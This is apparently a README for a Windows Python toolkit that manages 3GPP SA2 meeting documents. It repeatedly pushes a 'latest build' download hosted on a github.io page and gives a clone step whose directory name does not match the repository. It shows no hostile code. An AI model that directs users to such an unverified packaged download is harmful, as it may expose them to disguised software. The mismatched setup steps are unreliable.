# 3GPP Meeting Tools vLatest - SA2 Meeting Productivity Suite for 2026

> **3GPP Meeting Tools is a Windows-oriented set of Python utilities for managing SA2 meeting documents, reviews, approvals, and connected Microsoft Office tasks in the latest available release.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-vLatest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/henrymooreuft8170/3gpp-meeting-tools-windows?style=flat-square)](https://github.com/henrymooreuft8170/3gpp-meeting-tools-windows)

---

<p align="center">
  <a href="https://henrymooreuft8170.github.io/3gpp-meeting-tools-windows/">
    <img src="https://img.shields.io/badge/Download-3GPP%20Meeting%20Tools%20Latest-brightgreen?style=for-the-badge" alt="Download 3GPP Meeting Tools">
  </a>
</p>

> **[Download the latest 3GPP Meeting Tools build](https://henrymooreuft8170.github.io/3gpp-meeting-tools-windows/)**

---

[Download Latest Build](https://henrymooreuft8170.github.io/3gpp-meeting-tools-windows/)

---

## Overview

3GPP Meeting Tools collects practical helpers for teams handling SA2 meeting content. The utilities can search for TDocs in web locations, local repositories, and inbox folders, as well as find the newest agenda files within meeting-related directories.

The toolkit is designed to support preparation and review from start to finish. It can create ordered offline TDoc caches, merge feedback from multiple colleagues, arrange eMeeting and email approvals by agenda item, and compare document revisions. Office-related operations are included as well, such as changing tracked-change author names in Word and producing Excel exports.

---

## What It Provides

- Find TDocs across configured web sources, local repositories, and inbox directories.
- Identify the latest agenda file in local or remote meeting folders.
- Maintain an ordered local TDoc cache for offline work.
- Merge comments from multiple reviewers into a combined TDoc view.
- Organize eMeeting and email approval messages according to agenda item.
- Review differences between separate TDoc revisions.
- Store specification files locally and convert them to PDF.
- Replace the tracked-change author name in the currently active Word document.
- Send TDoc lists and CR cover pages to Excel.

---

## Getting Started

Clone the project into a directory on your computer:

```bash
git clone https://github.com/henrymooreuft8170/3gpp-meeting-tools-windows.git
cd 3gpp-meeting-tools
```

These utilities are written in Python and are intended for Windows. Inspect the repository and run the Python utility that matches the task, following the instructions included with the project. Before starting, ensure that the document sources, meeting directories, inbox locations, Word files, and Excel-related paths required for your process are available.

If you obtained a packaged download, unpack it into an appropriate local directory and launch the required utility from there.

---

## Typical Workflow

The tools can be used in a sequence such as this:

1. Set the web sources, local repositories, meeting directories, and inbox folders that contain the relevant TDocs.
2. Search those locations and determine the current meeting agenda.
3. Create or update the ordered offline document cache.
4. Compare chosen TDoc versions and merge comments supplied by colleagues.
5. Arrange eMeeting and email approval messages by agenda item.
6. Create Excel reports containing TDoc lists or CR cover pages as needed.
7. Cache specification files and produce PDF copies for reference.
8. Run the Word helper to change the tracked-change author name in the active document.

Each utility may have its own entry point and command-line arguments. Refer to the project files and the local help output to determine how to invoke the particular tool you need.

---

## Settings

The required configuration varies by utility and by the directories available in your Windows setup. Supply the applicable locations in the following structure:

```ini
[meeting]
web_locations=
local_repositories=
meeting_folders=
inbox_folders=

[cache]
tdoc_directory=
specification_directory=
pdf_output_directory=

[export]
excel_output_directory=
```

Where possible, place cache and export destinations outside the original meeting source directories. Before running a search, conversion, or export, verify that every configured path can be accessed.

---

## System Requirements

- Windows.
- Python.
- Access to the web sources, local repositories, meeting folders, or inbox folders used by the selected workflow.
- Microsoft Word for Word-related operations.
- Microsoft Excel for Excel exports.
- Enough local disk space for TDoc and specification-file caches.
- Read access to source locations and write access to cache and export destinations.

---

## Frequently Asked Questions

### What type of work is this toolkit designed for?

It is aimed at users who prepare, review, organize, and track 3GPP SA2 meeting documents, including associated approval information.

### Is offline review supported?

Yes. TDocs may be stored in an ordered local cache for offline review, and specification files may also be cached and converted into PDF documents.

### Where do I keep the configuration?

Follow the configuration method used by the individual utility in the repository. Keep source-folder paths, inbox locations, cache directories, and export destinations somewhere that is straightforward to inspect and maintain.

### How can I move to a newer build?

Download the latest available build or pull the newest changes from the repository. After updating, check for configuration changes before running the utilities.

### Why can a TDoc, agenda, or message be absent from the results?

Confirm that the configured web sources, repositories, meeting folders, and inbox directories are reachable and correct. Then check that the expected TDoc, agenda file, or approval message actually exists in those locations.

### What can cause an export to fail?

Make sure the output directory permits writing and that the Office application required for the operation is installed and available. The utility's local output or error details may provide additional information.

### How do I ask for assistance?

Create an issue in the project repository. Include the utility involved, the workflow you attempted, relevant configuration information, and a short description of what happened.

---

## Future Improvements

Possible follow-up work includes:

- Improving TDoc and agenda discovery.
- Refining the structure of offline caches.
- Extending revision comparison and review workflows.
- Simplifying the Word and Excel connections.
- Clarifying configuration and first-use setup.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
